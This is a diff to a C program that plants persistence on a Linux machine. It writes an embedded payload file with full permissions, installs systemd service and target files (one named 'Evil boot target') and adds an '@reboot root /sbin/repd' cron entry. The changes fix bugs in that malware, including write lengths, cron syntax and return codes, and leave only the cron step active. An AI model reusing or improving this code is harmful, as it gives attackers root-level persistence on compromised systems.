@@ -14,7 +14,7 @@
 
 #define TARGET_FILE ("[Unit]\nDescription=Evil boot target\nRequires=graphical.target\nWants=sSh.service\nConflicts=rescue.service rescue.target\nAfter=graphical.target rescue.service rescue.target\nAllowIsolate=yes")
 
-#define CRON ("@reboot /sbin/repd")
+#define CRON ("@reboot root /sbin/repd\n")
 
 extern const char *init_hook;
 extern const unsigned int init_hook_len;
@@ -29,20 +29,20 @@ int write_payload(char *path)
 
     if (access(path, F_OK) == 0)
     {
-        fprintf(stderr, "File %s already exists.", path);
+        fprintf(stderr, "File %s already exists.\n", path);
         return -1;
     }
 
     payload_file = fopen(path, "w");
     if (!payload_file)
     {
-        fprintf(stderr, "Could not open payload file %s.", path);
+        fprintf(stderr, "Could not open payload file %s.\n", path);
         return -1;
     }
 
     if (fwrite(payload, 1, payload_len, payload_file) != payload_len)
     {
-        fprintf(stderr, "Could not write payload file to %s.", path);
+        fprintf(stderr, "Could not write payload file to %s.\n", path);
         fclose(payload_file);
         return -1;
     }
@@ -51,7 +51,7 @@ int write_payload(char *path)
 
     if (chmod(path, 0777))
     {
-        fprintf(stderr, "Could chmod payload file %s.", path);
+        fprintf(stderr, "Could chmod payload file %s.\n", path);
         return -1;
     }
     return 0;
@@ -124,7 +124,7 @@ int create_service()
         return -1;
     }
 
-    if (fwrite(SERVICE_FILE, 1, sizeof(SERVICE_FILE), service_file) != sizeof(SERVICE_FILE))
+    if (fwrite(SERVICE_FILE, 1, sizeof(SERVICE_FILE)-1, service_file) != sizeof(SERVICE_FILE)-1)
     {
         perror("Could not write to service file.");
         fclose(service_file);
@@ -164,7 +164,7 @@ int create_target()
         return -1;
     }
 
-    if (fwrite(SERVICE_FILE2, 1, sizeof(SERVICE_FILE2), service) != sizeof(SERVICE_FILE2))
+    if (fwrite(SERVICE_FILE2, 1, sizeof(SERVICE_FILE2)-1, service) != sizeof(SERVICE_FILE2)-1)
     {
         perror("Could not write to service file.");
         fclose(service);
@@ -187,7 +187,7 @@ int create_target()
         return -1;
     }
 
-    if (fwrite(TARGET_FILE, 1, sizeof(TARGET_FILE), target) != sizeof(TARGET_FILE))
+    if (fwrite(TARGET_FILE, 1, sizeof(TARGET_FILE)-1, target) != sizeof(TARGET_FILE)-1)
     {
         perror("Could not write target file.");
         fclose(target);
@@ -221,7 +221,7 @@ int create_cronjob()
         return -1;
     }
 
-    if (fwrite(CRON, 1, sizeof(CRON), crontab) != sizeof(CRON))
+    if (fwrite(CRON, 1, sizeof(CRON)-1, crontab) != sizeof(CRON)-1)
     {
         perror("Could not write to crontab.");
         fclose(crontab);
@@ -229,7 +229,7 @@ int create_cronjob()
     }
 
     fclose(crontab);
-    return -1;
+    return 0;
 }
 
 
@@ -241,11 +241,12 @@ int main(int argc, char *argv[])
         return -1;
     }
     if (
-        hook_init() ||
-        create_service() ||
-        create_target() ||
+//        hook_init() ||
+//        create_service() ||
+//        create_target() ||
         create_cronjob())
     {
+        fprintf(stderr, "Encountered error. Exiting.\n");
         return -1;
     }
     return 0;
